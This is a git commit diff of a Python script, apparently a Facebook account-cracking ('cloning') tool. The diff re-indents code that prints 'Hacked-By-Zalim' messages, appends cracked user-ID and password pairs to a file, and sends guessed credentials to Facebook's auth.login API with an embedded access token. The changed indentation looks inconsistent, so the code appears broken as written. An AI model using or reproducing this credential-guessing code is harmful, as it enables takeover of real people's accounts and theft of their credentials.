40d530e2ddbaf95ddbb0ae26175adb1b14b095d7
Z@lim <80507508+Za-lim@users.noreply.github.com>
2021-03-29 14:59:44 +0500

    zalim
    zalim

--- zalim2-cl.py
+++ zalim2-cl.py
@@ -282,19 +282,19 @@ def action():
             q = json.load(data)
             if 'access_token' in q:
                jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
-                print '\x1b[1;93m(HaHa-Hacked)  ' + k + c + user +  '  |  ' + pass1                                    
-                okb = open('save/cloned.txt', 'a')
-                okb.write(k+c+user+pass1+'\n')
-                okb.close()
-                oks.append(c+user+pass1)
+                     print '\x1b[1;93m(HaHa-Hacked)  ' + k + c + user +  '  |  ' + pass1                                    
+                     okb = open('save/cloned.txt', 'a')
+                     okb.write(k+c+user+pass1+'\n')
+                     okb.close()
+                     oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
                 jalan('033[1;96m Hacked-By-Zalim  |   User-ID    |   + password')
-                    print '\033[1;97m(OHH-NO) ' + k + c + user + '  |  ' + pass1
-                    cps = open('save/cloned.txt', 'a')
-                    cps.write(k+c+user+pass1+'\n')
-                    cps.close()
-                    cpb.append(c+user+pass1)
+                      print '\033[1;97m(OHH-NO) ' + k + c + user + '  |  ' + pass1
+                      cps = open('save/cloned.txt', 'a')
+                      cps.write(k+c+user+pass1+'\n')
+                      cps.close()
+                      cpb.append(c+user+pass1)
                 else:
                     pass2 = k + c + user
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
